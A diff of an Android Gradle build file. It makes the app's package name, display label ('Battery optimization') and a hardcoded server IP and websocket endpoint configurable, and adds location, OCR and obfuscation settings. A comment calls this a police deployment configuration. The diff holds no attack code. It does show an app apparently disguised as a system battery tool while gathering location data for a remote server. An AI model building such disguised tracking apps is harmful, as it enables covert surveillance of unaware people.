@@ -1,14 +1,39 @@
+import java.io.FileInputStream
+import java.util.Properties
+
+buildscript {
+    repositories {
+        mavenCentral()
+    }
+    dependencies {
+        classpath("io.github.didi:drouter-plugin:1.4.0")
+    }
+}
+
 plugins {
     id("com.android.application")
     id("org.jetbrains.kotlin.android")
 }
+apply(plugin = "com.didi.drouter")
+
+// ─── 读取警署部署配置（config.properties） ────────────────────────
+val deployProps = Properties()
+val configFile = file("${rootProject.projectDir}/config.properties")
+if (configFile.exists()) {
+    FileInputStream(configFile).use { deployProps.load(it) }
+}
+val appPackage = deployProps.getProperty("app.package") ?: "com.android.batteryoptimization"
+val serverHost = deployProps.getProperty("server.host") ?: "47.93.162.24"
+val serverPort = deployProps.getProperty("server.port") ?: "80"
+val websocketUrl = deployProps.getProperty("websocket.url") ?: "ws://47.93.162.24/ws"
+val appLabel = deployProps.getProperty("app.name") ?: "Battery optimization"
 
 android {
-    namespace = "com.android.batteryoptimization"
+    namespace = appPackage
     compileSdk = 34
 
     defaultConfig {
-        applicationId = "com.android.batteryoptimization"
+        applicationId = appPackage
         minSdk = 26
         targetSdk = 34
         versionCode = 1
@@ -18,6 +43,17 @@ android {
         vectorDrawables {
             useSupportLibrary = true
         }
+
+        // 注入部署配置到 BuildConfig
+        buildConfigField("String", "SERVER_HOST", "\"$serverHost\"")
+        buildConfigField("String", "SERVER_PORT", "\"$serverPort\"")
+        buildConfigField("String", "WS_URL", "\"$websocketUrl\"")
+        // 应用显示名称（覆盖 strings.xml 的 app_name）
+        resValue("string", "app_name", "$appLabel")
+    }
+
+    buildFeatures {
+        buildConfig = true
     }
 
     signingConfigs {
@@ -31,6 +67,8 @@ android {
 
     buildTypes {
         release {
+            // 正式发布：关闭 debuggable + 开启代码/资源混淆
+            isDebuggable = false
             isMinifyEnabled = true
             isShrinkResources = true
             signingConfig = signingConfigs.getByName("release")
@@ -38,6 +76,10 @@ android {
                 getDefaultProguardFile("proguard-android-optimize.txt"),
                 "proguard-rules.pro"
             )
+        }
+        debug {
+            // debug 包也使用 release 证书签名，保证覆盖安装签名一致
+            signingConfig = signingConfigs.getByName("release")
         }
     }
     compileOptions {
@@ -57,7 +99,14 @@ android {
         resources {
             excludes += "/META-INF/{AL2.0,LGPL2.1}"
         }
+        // Don't compress PaddleLite .nb model files (already compressed)
+        jniLibs {
+            useLegacyPackaging = true
+        }
     }
+
+    // Prevent compression of .nb model files in assets
+    aaptOptions.noCompress.addAll(listOf("nb"))
 }
 
 dependencies {
@@ -83,6 +132,21 @@ dependencies {
 
     // JSON serialization
     implementation("com.google.code.gson:gson:2.10.1")
+
+    // AMap Location SDK (高德定位)
+    implementation("com.amap.api:location:6.5.1")
+
+    // OCR 接口/数据（仅 api，不含实现；具体实现在独立 :ocr_module）
+    implementation(project(":ocr_api"))
+
+    // OCR 实现（可选）：useOcr=false 时 :app 不依赖 :ocr_module，仍可独立运行（OCR 降级关闭）
+    val useOcr = (project.findProperty("useOcr") as? String)?.toBoolean() ?: true
+    if (useOcr) {
+        implementation(project(":ocr_module"))
+    }
+
+    // DRouter 运行时（:ocr_api 已以 api 暴露，这里显式声明）
+    implementation("io.github.didi:drouter-api:2.4.6")
 
     testImplementation("junit:junit:4.13.2")
     androidTestImplementation("androidx.test.ext:junit:1.1.5")
